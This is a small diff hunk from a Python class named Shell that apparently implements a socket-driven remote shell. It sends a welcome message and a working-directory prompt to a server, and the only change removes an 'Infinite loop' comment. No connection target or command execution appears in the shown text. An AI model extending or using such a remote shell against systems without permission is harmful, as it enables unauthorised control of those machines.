@@ -28,7 +28,7 @@ class Shell:
 
         self.sock.send(str.encode(welcome_msg))
 
-        while 1:  # Infinite loop
+        while 1:
             try:
                 # Gets cwd and sends to server
                 self.sock.send(str.encode(os.getcwd() + "# "))
